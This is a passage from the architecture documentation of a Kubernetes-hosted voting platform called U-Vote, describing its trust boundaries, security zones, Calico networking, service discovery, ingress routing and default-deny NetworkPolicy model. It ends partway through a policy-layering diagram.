**Boundary 4: Database User to Table Permissions**

Within the database, each service's user has GRANT-based permissions restricting
access to specific tables and operations. This boundary operates at the SQL level,
independent of network policies.

**Boundary 5: Table-Level Enforcement**

Database triggers on the `votes` table prevent UPDATE and DELETE operations
regardless of user permissions. This is the innermost trust boundary, providing
immutability guarantees that cannot be overridden by application code or database
user privileges (short of superuser access).

#### 2.2.3 Verification Mechanisms

Each trust boundary employs specific verification mechanisms:

| Boundary | Verification Mechanism | Enforcement Point |
|----------|----------------------|-------------------|
| 1: Internet → Ingress | TLS termination, rate limiting | Ingress controller |
| 2: Ingress → Services | NetworkPolicy (namespace selector) | Calico CNI / iptables |
| 3: Services → Database | NetworkPolicy (pod selector) + DB authentication | Calico CNI + PostgreSQL |
| 4: DB User → Tables | PostgreSQL GRANT/REVOKE | PostgreSQL authorisation |
| 5: Table → Operations | PostgreSQL triggers | PostgreSQL trigger engine |

#### 2.2.4 Micro-Segmentation

Micro-segmentation in U-Vote operates at the pod level, which is the finest
granularity available in Kubernetes networking. Unlike traditional network
segmentation, which operates at the subnet or VLAN level, pod-level
micro-segmentation allows distinct policies for each individual workload.

The micro-segmentation model creates the following isolated segments:

```
Micro-Segmentation Map:

┌─────────────────────────────────────────────────────────────────┐
│                        uvote-dev namespace                       │
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │ frontend │  │   auth   │  │ election │  │  voting  │       │
│  │  :3000   │  │  :8001   │  │  :8002   │  │  :8003   │       │
│  │          │  │          │  │          │  │          │       │
│  │ IN: nginx│  │ IN: nginx│  │ IN: nginx│  │ IN: nginx│       │
│  │ OUT: dns │  │ OUT: dns │  │ OUT: dns │  │ OUT: dns │       │
│  │      aud │  │      db  │  │      db  │  │      db  │       │
│  │          │  │      aud │  │      aud │  │      aud │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │ results  │  │  audit   │  │  admin   │  │  email   │       │
│  │  :8004   │  │  :8005   │  │  :8006   │  │  :8007   │       │
│  │          │  │          │  │          │  │          │       │
│  │ IN: nginx│  │ IN: svcs │  │ IN: nginx│  │ IN: none │       │
│  │ OUT: dns │  │ OUT: dns │  │ OUT: dns │  │ OUT: dns │       │
│  │      db  │  │      db  │  │      db  │  │      aud │       │
│  │      aud │  │          │  │      aud │  │          │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
│                                                                  │
│  ┌──────────┐                                                   │
│  │postgresql│                                                   │
│  │  :5432   │                                                   │
│  │          │                                                   │
│  │ IN: 6svc │                                                   │
│  │ OUT: dns │                                                   │
│  └──────────┘                                                   │
└─────────────────────────────────────────────────────────────────┘
```

Each segment (pod) has a unique combination of ingress and egress permissions.
No two services have identical network profiles, reflecting the distinct
functional requirements of each microservice.

### 2.3 Security Zones

The U-Vote platform is organised into five security zones, each with distinct
trust levels and access controls. Traffic flowing between zones must cross a
trust boundary and satisfy the applicable NetworkPolicy rules.

#### Security Zone Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   INTERNET ZONE (Untrusted)                                                │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │  Public internet traffic from voters, administrators, and           │  │
│   │  potentially malicious actors.                                      │  │
│   └──────────────────────────────┬──────────────────────────────────────┘  │
│                                  │                                         │
│                          Ports 80/443                                      │
│                     (Kind extraPortMappings)                               │
│                                  │                                         │
│   ┌──────────────────────────────▼──────────────────────────────────────┐  │
│   │  DMZ ZONE (ingress-nginx namespace)                                 │  │
│   │                                                                      │  │
│   │  ┌───────────────────────────────────────────────────────────────┐  │  │
│   │  │                   Ingress Controller                          │  │  │
│   │  │                                                               │  │  │
│   │  │  TLS Termination · Path-Based Routing · Rate Limiting         │  │  │
│   │  │                                                               │  │  │
│   │  │  Routes:                                                      │  │  │
│   │  │    /              → frontend:3000                              │  │  │
│   │  │    /api/auth      → auth:8001                                 │  │  │
│   │  │    /api/elections → election:8002                              │  │  │
│   │  │    /api/voting    → voting:8003                                │  │  │
│   │  │    /api/results   → results:8004                               │  │  │
│   │  │    /api/admin     → admin:8006                                 │  │  │
│   │  └───────────────────────────────────────────────────────────────┘  │  │
│   └──────────────────────────────┬──────────────────────────────────────┘  │
│                                  │                                         │
│                    NetworkPolicy: 03-allow-from-ingress                    │
│                    (6 policies, one per exposed service)                   │
│                                  │                                         │
│   ┌──────────────────────────────▼──────────────────────────────────────┐  │
│   │  FRONTEND ZONE (uvote-dev namespace, frontend pod)                  │  │
│   │                                                                      │  │
│   │  ┌───────────────────────────────────────────────────────────────┐  │  │
│   │  │                   Frontend Service                            │  │  │
│   │  │                                                               │  │  │
│   │  │  Jinja2 SSR · Port 3000 · No Database Access                  │  │  │
│   │  │                                                               │  │  │
│   │  │  Ingress: ingress-nginx namespace only                        │  │  │
│   │  │  Egress:  DNS (kube-system:53) + Audit (audit-service:8005)  │  │  │
│   │  └───────────────────────────────────────────────────────────────┘  │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │  SERVICES ZONE (uvote-dev namespace, backend pods)                   │  │
│   │                                                                      │  │
│   │  ┌────────┐ ┌──────────┐ ┌────────┐ ┌─────────┐ ┌───────┐         │  │
│   │  │  Auth  │ │ Election │ │ Voting │ │ Results │ │ Admin │         │  │
│   │  │ :8001  │ │  :8002   │ │ :8003  │ │  :8004  │ │ :8006 │         │  │
│   │  └────┬───┘ └────┬─────┘ └───┬────┘ └────┬────┘ └───┬───┘         │  │
│   │       │          │           │            │          │              │  │
│   │       └──────────┴─────┬─────┴────────────┴──────────┘              │  │
│   │                        │                                             │  │
│   │  ┌─────────────────────┐  ┌──────────────────────────────────────┐  │  │
│   │  │  Internal Services  │  │  NetworkPolicy: 04-allow-audit       │  │  │
│   │  │                     │  │  (bidirectional audit channel)        │  │  │
│   │  │  ┌───────┐ ┌─────┐ │  └────────────────┬─────────────────────┘  │  │
│   │  │  │ Audit │ │Email│ │                    │                        │  │
│   │  │  │ :8005 │ │:8007│ │◀───────────────────┘                        │  │
│   │  │  └───────┘ └─────┘ │                                             │  │
│   │  └─────────────────────┘                                             │  │
│   └──────────────────────────┬───────────────────────────────────────────┘  │
│                              │                                              │
│              NetworkPolicy: 02-allow-to-database                           │
│              (bidirectional database access)                                │
│                              │                                              │
│   ┌──────────────────────────▼──────────────────────────────────────────┐  │
│   │  DATA ZONE (uvote-dev namespace, postgresql pod)                    │  │
│   │                                                                      │  │
│   │  ┌───────────────────────────────────────────────────────────────┐  │  │
│   │  │                    PostgreSQL Database                         │  │  │
│   │  │                                                               │  │  │
│   │  │  Port 5432 · 6 Service Users · 7 Tables                       │  │  │
│   │  │                                                               │  │  │
│   │  │  Ingress: 6 backend services only (pod selector)              │  │  │
│   │  │  Egress:  DNS only                                            │  │  │
│   │  │                                                               │  │  │
│   │  │  Tables: admins, elections, candidates, voters,               │  │  │
│   │  │          voting_tokens, votes (immutable), audit_logs         │  │  │
│   │  └───────────────────────────────────────────────────────────────┘  │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### Zone Descriptions

| Zone | Trust Level | Components | Access Control |
|------|------------|------------|----------------|
| Internet | Untrusted | External clients | None (public) |
| DMZ | Semi-Trusted | Ingress controller | Kind port mappings, TLS |
| Frontend | Low Trust | Frontend service | Ingress policy, no DB access |
| Services | Medium Trust | 7 backend services | Ingress + DB + Audit policies |
| Data | High Trust | PostgreSQL | DB policies + per-user permissions + triggers |

#### Inter-Zone Traffic Flows

| Source Zone | Destination Zone | Protocol | Policy |
|-------------|-----------------|----------|--------|
| Internet | DMZ | HTTPS (443) | Kind port mappings |
| DMZ | Frontend | HTTP (3000) | `03-allow-from-ingress` |
| DMZ | Services | HTTP (8001-8006) | `03-allow-from-ingress` |
| Services | Data | TCP (5432) | `02-allow-to-database` |
| Services | Services (Audit) | HTTP (8005) | `04-allow-audit` |
| All Zones | kube-system | UDP/TCP (53) | `01-allow-dns` |

#### Prohibited Inter-Zone Traffic

The following traffic flows are explicitly prohibited by the default-deny policy
and the absence of permissive policies:

| Source | Destination | Reason Blocked |
|--------|-------------|----------------|
| Frontend | PostgreSQL | No database egress policy for Frontend |
| Email | PostgreSQL | No database egress policy for Email |
| Internet | Audit Service | No ingress policy from outside cluster |
| Internet | Email Service | No ingress policy from outside cluster |
| Services → Services | Direct (non-audit) | No inter-service policies exist |
| Any pod | External internet | No general egress policy exists |

---

## 3. Network Architecture

### 3.1 Calico Architecture

#### 3.1.1 Overview

Calico is the Container Network Interface (CNI) plugin deployed on the U-Vote
Kind cluster. Version 3.26.1 was selected for its mature NetworkPolicy
implementation, broad community support, and compatibility with Kind clusters
when the default CNI (kindnet) is disabled.

Calico provides three fundamental networking capabilities for the U-Vote platform:

1. **Pod Networking**: Assigns IP addresses to pods and establishes routes between
   pods on the same node and across different nodes.
2. **NetworkPolicy Enforcement**: Translates Kubernetes NetworkPolicy resources
   into data-plane rules (iptables or eBPF) that filter traffic at the kernel
   level on each node.
3. **IP Address Management (IPAM)**: Manages allocation of IP addresses from the
   configured pod CIDR (`192.168.0.0/16`).

#### 3.1.2 Calico Control Plane

The Calico control plane consists of several components that run as pods in the
`kube-system` namespace (or a dedicated `calico-system` namespace depending on
the installation method):

```
Calico Control Plane Architecture:

┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes API Server                        │
│                                                                  │
│  Stores NetworkPolicy resources, Calico CRDs, pod metadata      │
└───────────┬─────────────────────────────┬───────────────────────┘
            │                             │
            │  Watch/List                 │  Watch/List
            │                             │
┌───────────▼──────────────┐  ┌───────────▼──────────────────────┐
│   calico-kube-controllers │  │       calico-node (DaemonSet)    │
│   (Deployment)            │  │                                   │
│                           │  │  Runs on EVERY node:              │
│  • Policy synchronisation │  │  • Felix: policy enforcement      │
│  • IPAM garbage collection│  │  • BIRD: BGP route distribution   │
│  • Node status management │  │  • confd: dynamic config          │
│                           │  │                                   │
│  Runs on: 1 node          │  │  Runs on: all 3 nodes             │
└───────────────────────────┘  └──────────────────────────────────┘
```

**calico-kube-controllers**: A single-replica Deployment that watches the
Kubernetes API for changes to NetworkPolicy resources, pod labels, namespaces,
and other objects relevant to Calico's operation. It synchronises this state
with Calico's internal data store.

**calico-node**: A DaemonSet that runs on every node in the cluster (all three
Kind nodes). Each calico-node pod contains:

- **Felix**: The primary Calico agent. Felix watches for NetworkPolicy updates
  from the Kubernetes API and programs iptables rules (or eBPF programs) on the
  local node to enforce those policies. When a new NetworkPolicy is created or
  an existing one is modified, Felix recalculates the required firewall rules
  and applies them within seconds.

- **BIRD**: A BGP (Border Gateway Protocol) daemon that distributes pod network
  routes between nodes. When a new pod is created on a node, BIRD advertises the
  pod's IP address to the other nodes via BGP, ensuring that pods on different
  nodes can reach each other. In Kind clusters, Calico may use VXLAN overlay
  networking instead of BGP depending on the configuration.

- **confd**: A configuration management daemon that watches Calico's data store
  for changes and dynamically regenerates BIRD's configuration files when the
  network topology changes.

#### 3.1.3 Calico Data Plane

The data plane is where actual packet filtering occurs. When Felix receives a
NetworkPolicy update, it translates the policy's selectors and rules into iptables
chains and rules on the local node.

```
Data Plane Packet Flow:

  Pod A (source)
      │
      ▼
  veth pair (pod's network interface ←→ host interface)
      │
      ▼
  iptables FORWARD chain
      │
      ├─── cali-FORWARD chain (Calico's main chain)
      │       │
      │       ├─── cali-from-wl-dispatch (workload dispatch)
      │       │       │
      │       │       └─── cali-fw-<endpoint> (per-endpoint rules)
      │       │               │
      │       │               ├─── ALLOW (matches policy) ──▶ Continue
      │       │               │
      │       │               └─── DROP (no matching policy) ──▶ Packet dropped
      │       │
      │       └─── cali-to-wl-dispatch (destination dispatch)
      │               │
      │               └─── cali-tw-<endpoint> (per-endpoint rules)
      │                       │
      │                       ├─── ALLOW ──▶ Deliver to pod
      │                       │
      │                       └─── DROP ──▶ Packet dropped
      │
      ▼
  Pod B (destination)
```

For the U-Vote platform, this means:

1. When a Frontend pod attempts to send a packet to the PostgreSQL pod, the packet
   enters the iptables FORWARD chain on the source node.
2. Calico's `cali-fw-<frontend-endpoint>` chain is evaluated. This chain contains
   rules derived from all NetworkPolicies whose `podSelector` matches the Frontend
   pod.
3. Since no NetworkPolicy grants the Frontend pod egress to PostgreSQL (port 5432),
   the packet matches no allow rule and is dropped.
4. The Frontend pod's connection attempt times out — it never receives a TCP RST
   or ICMP unreachable, because the packet is silently dropped.

Conversely, when the Auth service pod sends a packet to PostgreSQL on port 5432:

1. The packet enters the iptables FORWARD chain.
2. Calico's `cali-fw-<auth-endpoint>` chain is evaluated.
3. The `allow-database-egress` policy (from `02-allow-to-database.yaml`) grants
   the Auth service egress to pods labelled `app: postgresql` on port 5432/TCP.
4. The packet is allowed through the FORWARD chain.
5. On the destination node, Calico's `cali-tw-<postgresql-endpoint>` chain is
   evaluated.
6. The `allow-to-database` policy grants PostgreSQL ingress from pods labelled
   `app: auth-service` on port 5432/TCP.
7. The packet is delivered to the PostgreSQL pod.

#### 3.1.4 IPAM (IP Address Management)

Calico's IPAM component manages the allocation of IP addresses from the pod
CIDR (`192.168.0.0/16`). The IPAM configuration for the U-Vote cluster operates
as follows:

- **CIDR**: `192.168.0.0/16` provides 65,534 usable addresses, far more than
  required for the U-Vote platform's nine pods (eight services plus PostgreSQL).
  This generous allocation is the Calico default and ensures no IP exhaustion
  issues even if the cluster scales significantly.

- **Block Size**: Calico divides the `/16` CIDR into smaller blocks (typically
  `/26` blocks providing 64 addresses each) and assigns one or more blocks to
  each node. This block-based allocation enables efficient route aggregation —
  instead of advertising individual `/32` routes for each pod, nodes advertise
  the `/26` block routes.

- **IP Assignment**: When a new pod is scheduled on a node, Calico's IPAM assigns
  the next available IP address from that node's allocated block. The IP address
  is programmed on the pod's virtual ethernet (veth) interface.

```
IPAM Block Allocation (illustrative):

┌───────────────────────────────────────────────────────────┐
│              Pod CIDR: 192.168.0.0/16                      │
│                                                            │
│  ┌─────────────────┐  ┌─────────────────┐                │
│  │ uvote-worker     │  │ uvote-worker2    │                │
│  │                  │  │                  │                │
│  │ Block:           │  │ Block:           │                │
│  │ 192.168.x.0/26   │  │ 192.168.y.0/26   │                │
│  │                  │  │                  │                │
│  │ Pods:            │  │ Pods:            │                │
│  │  frontend        │  │  voting-service  │                │
│  │  auth-service    │  │  results-service │                │
│  │  election-svc    │  │  admin-service   │                │
│  │  postgresql      │  │  email-service   │                │
│  │                  │  │  audit-service   │                │
│  └─────────────────┘  └─────────────────┘                │
│                                                            │
│  Note: Actual pod placement depends on Kubernetes          │
│  scheduler decisions. This diagram is illustrative.        │
└───────────────────────────────────────────────────────────┘
```

### 3.2 Pod Network

#### 3.2.1 Subnet Configuration

The pod network is configured with the CIDR `192.168.0.0/16`, established at
cluster creation time through the Kind configuration:

```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
networking:
  disableDefaultCNI: true
  podSubnet: "192.168.0.0/16"
```

This CIDR is passed to the Kubernetes API server via the `--cluster-cidr` flag
and to Calico via its IPAM configuration. The alignment between these two
configurations is critical — a mismatch would result in pods receiving IP
addresses that the Kubernetes API server does not recognise as belonging to the
cluster network.

Key subnet characteristics:

| Property | Value |
|----------|-------|
| Network Address | 192.168.0.0 |
| Subnet Mask | 255.255.0.0 (/16) |
| Usable Addresses | 65,534 |
| Address Range | 192.168.0.1 — 192.168.255.254 |
| Required Pods | 9 (8 services + 1 database) |
| Utilisation | < 0.02% |

The low utilisation percentage is expected for a development cluster. The `/16`
subnet is the Calico default and provides ample room for scaling, pod restarts
(which allocate new IPs), and any additional system pods (Calico, CoreDNS,
kube-proxy, etc.).

#### 3.2.2 IP Assignment and Pod Networking

Each pod in the U-Vote platform receives a unique IP address from the
`192.168.0.0/16` CIDR. The IP is assigned when the pod is created and released
when the pod is terminated. IP addresses are not guaranteed to be stable across
pod restarts — a restarted pod may receive a different IP address.

This is why NetworkPolicies use label selectors rather than IP addresses to
identify pods. A policy targeting `app: auth-service` will match the Auth service
pod regardless of its current IP address. If the pod is restarted and receives a
new IP, the policy continues to apply because Calico re-evaluates label selectors
dynamically.

Pod network interface configuration:

```
Pod Network Stack:

┌────────────────────────────────────┐
│           Pod (container)           │
│                                    │
│  eth0: 192.168.x.y/32             │
│  default route → 169.254.1.1      │
│                                    │
└────────────┬───────────────────────┘
             │ veth pair
             │
┌────────────▼───────────────────────┐
│           Host (node)              │
│                                    │
│  caliXXXXXXXXXXX: (no IP)         │
│  iptables rules for policy         │
│  routing table: 192.168.x.y/32    │
│    via caliXXXXXXXXXXX             │
│                                    │
└────────────────────────────────────┘
```

Each pod has a virtual ethernet (veth) pair: one end inside the pod (visible as
`eth0`) and the other end on the host node (visible as `caliXXXXXXXXXXX`). The
pod's `eth0` interface has the assigned IP with a `/32` netmask, meaning the pod
sees itself as the only host on its "subnet." All traffic is routed through the
default gateway (`169.254.1.1`), which is a link-local address that Calico
responds to via proxy ARP on the host side of the veth pair.

This design means that all pod-to-pod traffic passes through the host's network
stack, where Calico's iptables rules are applied. There is no way for a pod to
bypass the host's iptables rules by communicating directly with another pod on
the same node.

#### 3.2.3 DNS Configuration

Every pod in the `uvote-dev` namespace is configured to use the cluster DNS
service (CoreDNS) for name resolution. The DNS configuration is injected by
the kubelet when the pod starts:

```
Pod DNS Configuration (/etc/resolv.conf):

  nameserver 10.96.0.10          # CoreDNS ClusterIP
  search uvote-dev.svc.cluster.local svc.cluster.local cluster.local
  options ndots:5
```

The `nameserver` points to the ClusterIP of the CoreDNS service in the
`kube-system` namespace. The `search` domains enable short-name resolution:

| Query | Resolved As |
|-------|------------|
| `postgresql` | `postgresql.uvote-dev.svc.cluster.local` |
| `auth-service` | `auth-service.uvote-dev.svc.cluster.local` |
| `frontend` | `frontend.uvote-dev.svc.cluster.local` |

The `ndots:5` option means that any query with fewer than 5 dots will have the
search domains appended before trying the query as-is. This ensures that
single-label service names like `postgresql` are resolved correctly within the
cluster.

DNS resolution is critical for the U-Vote platform because services reference
each other and the database by Kubernetes Service names, not by IP addresses.
This is why the `01-allow-dns.yaml` policy is the first allow policy applied
after the default deny — without DNS, no service can discover any other service.

The DNS allow policy permits egress to the `kube-system` namespace on port 53
(both UDP and TCP). UDP is used for standard DNS queries, while TCP is required
for responses that exceed 512 bytes (e.g., queries returning multiple records)
and for DNS zone transfers.

#### 3.2.4 Service Discovery

Kubernetes Service discovery in U-Vote relies on two mechanisms:

1. **DNS-Based Discovery**: When a service creates a Kubernetes Service resource
   (e.g., `postgresql` Service of type ClusterIP), CoreDNS automatically creates
   A records mapping the service name to its ClusterIP. Pods query DNS to resolve
   service names to ClusterIP addresses.

2. **Environment Variables**: Kubernetes injects environment variables into each
   pod with the ClusterIP and port of every Service in the same namespace. However,
   the U-Vote services primarily use DNS-based discovery for flexibility and to
   avoid dependency on pod creation order.

Service discovery flow:

```
Service Discovery Flow:

  Auth Service Pod                CoreDNS                Kubernetes API
       │                             │                        │
       │  DNS query:                 │                        │
       │  "postgresql"               │                        │
       │────────────────────────────▶│                        │
       │                             │                        │
       │                             │  Lookup Service:       │
       │                             │  "postgresql" in       │
       │                             │  "uvote-dev"           │
       │                             │───────────────────────▶│
       │                             │                        │
       │                             │  ClusterIP:            │
       │                             │  10.96.x.y             │
       │                             │◀───────────────────────│
       │                             │                        │
       │  DNS response:              │                        │
       │  10.96.x.y                  │                        │
       │◀────────────────────────────│                        │
       │                             │                        │
       │  TCP connect to             │                        │
       │  10.96.x.y:5432            │                        │
       │──────────────────────────────────────────────────────▶ PostgreSQL Pod
```

### 3.3 Service Network

#### 3.3.1 ClusterIP Services

All U-Vote services are deployed as Kubernetes Services of type ClusterIP. A
ClusterIP Service provides a stable virtual IP address (from the Service CIDR)
that load-balances traffic to the backend pods matching the Service's selector.

| Service Name | ClusterIP (assigned) | Target Port | Pod Selector |
|-------------|---------------------|-------------|--------------|
| frontend | 10.96.x.a | 3000 | app: frontend |
| auth-service | 10.96.x.b | 8001 | app: auth-service |
| election-service | 10.96.x.c | 8002 | app: election-service |
| voting-service | 10.96.x.d | 8003 | app: voting-service |
| results-service | 10.96.x.e | 8004 | app: results-service |
| audit-service | 10.96.x.f | 8005 | app: audit-service |
| admin-service | 10.96.x.g | 8006 | app: admin-service |
| email-service | 10.96.x.h | 8007 | app: email-service |
| postgresql | 10.96.x.i | 5432 | app: postgresql |

*Note: ClusterIP addresses are dynamically assigned by Kubernetes and are shown
as `10.96.x.y` placeholders. The actual addresses are stable for the lifetime of
the Service resource but are not hardcoded in any configuration.*

#### 3.3.2 Service CIDR

The Service CIDR is separate from the Pod CIDR. While the Pod CIDR is
`192.168.0.0/16`, the Service CIDR defaults to `10.96.0.0/12` in Kind clusters.
This separation ensures that pod IPs and service IPs never conflict.

| Network | CIDR | Purpose |
|---------|------|---------|
| Pod Network | 192.168.0.0/16 | Individual pod IP addresses |
| Service Network | 10.96.0.0/12 | ClusterIP virtual addresses |
| Node Network | 172.18.0.0/16 (Kind default) | Docker bridge for Kind nodes |

Traffic destined for a ClusterIP address is intercepted by kube-proxy (or its
iptables rules) and redirected to one of the backend pod IPs. This translation
happens transparently — the application pod sees only the ClusterIP in its DNS
response and sends traffic to that address.

#### 3.3.3 Kube-Proxy and Load Balancing

Kube-proxy runs on every node as a DaemonSet and is responsible for implementing
the ClusterIP abstraction. It watches the Kubernetes API for Service and Endpoint
changes and programs iptables rules (in iptables mode, the default for Kind) to
redirect traffic.

```
Kube-Proxy Traffic Flow:

  Source Pod                       iptables (kube-proxy rules)       Destination Pod
      │                                     │                            │
      │  TCP SYN to 10.96.x.y:5432          │                            │
      │────────────────────────────────────▶│                            │
      │                                     │                            │
      │                                     │  DNAT: 10.96.x.y:5432     │
      │                                     │  → 192.168.a.b:5432       │
      │                                     │                            │
      │                                     │  Forward to pod IP         │
      │                                     │───────────────────────────▶│
      │                                     │                            │
      │                                     │  TCP SYN-ACK               │
      │◀──────────────────────────────────────────────────────────────────│
```

For the U-Vote platform, kube-proxy's iptables rules perform DNAT (Destination
Network Address Translation) on packets destined for ClusterIP addresses,
rewriting the destination IP to the actual pod IP. This translation occurs before
Calico's NetworkPolicy rules are evaluated, which means that NetworkPolicies see
the destination pod's real IP address and label set, not the ClusterIP.

This is an important detail for NetworkPolicy evaluation: when a policy specifies
`podSelector: matchLabels: app: postgresql`, it matches based on the pod's labels,
not the Service's ClusterIP. The DNAT performed by kube-proxy ensures that the
packet arrives at the Calico policy engine with the correct destination pod
identity.

#### 3.3.4 Load Balancing Behaviour

For the U-Vote platform, each service has a single replica (one pod), so
kube-proxy's load balancing is effectively a passthrough. However, the
architecture supports horizontal scaling — if a service is scaled to multiple
replicas, kube-proxy will distribute traffic across all healthy replicas using
random selection with equal probability (iptables `--probability` rules).

NetworkPolicies remain effective regardless of replica count. A policy granting
ingress to pods with `app: postgresql` will apply to all pods matching that label,
whether there is one replica or ten. This is a fundamental advantage of
label-based policy selection over IP-based firewall rules.

### 3.4 Ingress Architecture

#### 3.4.1 Nginx Ingress Controller Placement

The Nginx Ingress Controller is deployed in the `ingress-nginx` namespace,
separate from the application namespace (`uvote-dev`). This namespace separation
is a security boundary: NetworkPolicies in `uvote-dev` use `namespaceSelector`
to identify traffic from the Ingress controller, and the Ingress controller
cannot be affected by policies in `uvote-dev`.

```
Ingress Controller Placement:

┌─────────────────────────────────────────────────────────────┐
│                    Kind Cluster: uvote                        │
│                                                              │
│  ┌───────────────────────┐  ┌─────────────────────────────┐ │
│  │ ingress-nginx          │  │ uvote-dev                    │ │
│  │ namespace              │  │ namespace                    │ │
│  │                        │  │                              │ │
│  │  ┌──────────────────┐ │  │  ┌────────┐  ┌────────────┐ │ │
│  │  │ ingress-nginx-    │ │  │  │frontend│  │auth-service│ │ │
│  │  │ controller        │─┼──┼─▶│  :3000 │  │   :8001    │ │ │
│  │  │                   │ │  │  └────────┘  └────────────┘ │ │
│  │  │ Listens on:       │ │  │                              │ │
│  │  │  - Port 80 (HTTP) │ │  │  ┌────────────┐ ┌────────┐ │ │
│  │  │  - Port 443 (TLS) │─┼──┼─▶│election-svc│ │voting  │ │ │
│  │  │                   │ │  │  │   :8002    │ │ :8003  │ │ │
│  │  │ Namespace:        │ │  │  └────────────┘ └────────┘ │ │
│  │  │  ingress-nginx    │ │  │                              │ │
│  │  └──────────────────┘ │  │  ┌────────────┐ ┌────────┐ │ │
│  │                        │  │  │results-svc │ │admin   │ │ │
│  │                        │──┼─▶│   :8004    │ │ :8006  │ │ │
│  │                        │  │  └────────────┘ └────────┘ │ │
│  └───────────────────────┘  │                              │ │
│                              │  ┌──────────┐ ┌──────────┐ │ │
│       NOT routed ──────────┼─X│audit-svc │ │email-svc│ │ │
│                              │  │  :8005   │ │  :8007  │ │ │
│                              │  └──────────┘ └──────────┘ │ │
│                              └─────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

The Ingress controller routes to six of the eight services. The Audit service
(port 8005) and Email service (port 8007) are intentionally excluded from ingress
routing, making them inaccessible from outside the cluster.

#### 3.4.2 Access Flow

The complete access flow from an external client to an application service
traverses the following path:

```
External Access Flow:

  1. Client sends HTTPS request to cluster IP on port 443
     │
  2. Kind extraPortMappings forwards port 443 to control-plane node
     │
  3. NodePort Service in ingress-nginx namespace receives traffic
     │
  4. Nginx Ingress Controller processes the request:
     │  a. TLS termination (if configured)
     │  b. URL path matching against Ingress resource rules
     │  c. Header processing and request modification
     │
  5. Ingress controller forwards to backend Service ClusterIP
     │
  6. Kube-proxy DNAT: ClusterIP → Pod IP
     │
  7. NetworkPolicy evaluation (Calico):
     │  a. Egress policy on ingress-nginx pod: allowed (no policy in that namespace)
     │  b. Ingress policy on target pod: 03-allow-from-ingress permits
     │     traffic from ingress-nginx namespace on the target port
     │
  8. Traffic delivered to application pod
```

#### 3.4.3 Ingress Route Mapping

The Ingress resource defines the URL path to Service mapping:

| URL Path | Target Service | Target Port | Service Type |
|----------|---------------|-------------|--------------|
| `/` | frontend | 3000 | User-facing web UI |
| `/api/auth` | auth-service | 8001 | Admin authentication |
| `/api/elections` | election-service | 8002 | Election management |
| `/api/voting` | voting-service | 8003 | Vote submission |
| `/api/results` | results-service | 8004 | Result viewing |
| `/api/admin` | admin-service | 8006 | Voter/candidate management |

All API routes are prefixed with `/api/`, creating a clear separation between
the frontend web interface (served at `/`) and the backend API endpoints. This
convention also simplifies ingress configuration and enables path-based routing
policies.

Services not listed in the Ingress resource are unreachable from outside the
cluster, regardless of NetworkPolicy configuration. The absence of an Ingress
route is the first layer of protection for internal services (Audit, Email).
The absence of a `03-allow-from-ingress` NetworkPolicy is the second layer.

#### 3.4.4 TLS Considerations

In a production deployment, TLS termination would occur at the Ingress controller,
with certificates managed through cert-manager or a similar tool. For the Kind
development cluster, TLS configuration is simplified but the architecture supports
full TLS termination with the following characteristics:

- **TLS Termination Point**: Ingress controller (edge termination)
- **Internal Traffic**: Unencrypted HTTP within the cluster network. This is
  acceptable because:
  - Pod-to-pod traffic within a Kind cluster does not traverse physical networks
  - NetworkPolicies ensure that only authorised pods can access each service
  - The cluster runs on a single machine, so there is no network eavesdropping
    risk from external switches or routers
- **Production Consideration**: In a production multi-node cluster, mutual TLS
  (mTLS) between services would be recommended, typically implemented through a
  service mesh (e.g., Istio, Linkerd) to encrypt in-cluster traffic.

#### 3.4.5 Rate Limiting

The Nginx Ingress Controller supports rate limiting through annotations on the
Ingress resource. Rate limiting provides protection against:

- **Brute-Force Attacks**: Limiting authentication attempts on `/api/auth`
- **Denial of Service**: Preventing a single client from overwhelming any service
- **Resource Exhaustion**: Protecting backend services from excessive request
  volumes

Rate limiting operates at the Ingress layer (Layer 7) and complements the
network-layer (Layer 3/4) protections provided by NetworkPolicies. While
NetworkPolicies control *who* can communicate, rate limiting controls *how much*
communication is permitted.

---

## 4. Network Policies

### 4.1 Policy Architecture

#### 4.1.1 Default Deny Model

The U-Vote platform implements a default-deny network model, which is the
foundational principle of the network security architecture. Under this model:

1. **All ingress traffic is denied** to every pod in the `uvote-dev` namespace
   unless an explicit NetworkPolicy permits it.
2. **All egress traffic is denied** from every pod in the `uvote-dev` namespace
   unless an explicit NetworkPolicy permits it.
3. **Allowed traffic paths are explicitly defined** through the remaining eleven
   NetworkPolicy resources.

The default-deny model inverts the traditional Kubernetes networking assumption.
By default, Kubernetes allows all pod-to-pod communication — any pod can reach
any other pod in the cluster without restriction. The default-deny policy
(`00-default-deny.yaml`) overrides this behaviour, creating a closed network
where every allowed connection must be deliberately authored.

This approach has several advantages for a voting platform:

- **Fail Secure**: If a new service is deployed without corresponding
  NetworkPolicies, it will be unable to communicate with anything. This prevents
  accidental exposure of sensitive endpoints.
- **Audit Trail**: Every allowed communication path is documented in a YAML file,
  making the network topology auditable and version-controllable.
- **Blast Radius Containment**: A compromised pod cannot pivot laterally unless
  its specific policies permit access to additional services.
- **Compliance**: CIS Kubernetes Benchmark 5.3.2 recommends default-deny policies.
  NIST SP 800-207 requires that access is denied by default in a zero-trust
  architecture.

#### 4.1.2 Explicit Allow Approach

The remaining eleven NetworkPolicies implement the explicit allow approach, where
each policy grants a specific, documented communication path. The policies are
organised into four functional categories:

```
Policy Layering:

  ┌─────────────────────────────────────────────────────────┐
  │  Layer 0: Default Deny (00-default-deny.yaml)           │
  │  Effect: Block ALL traffic                               │
  │  Policies: 1                                             │
  ├─────────────────────────────────────────────────────────┤
  │  Layer 1: DNS (01-allow-dns.yaml)                        │
  │  Effect: Allow DNS resolution to kube-system             │
  │  Policies: 1                                             │
  ├─────────────────────────────────────────────────────────┤
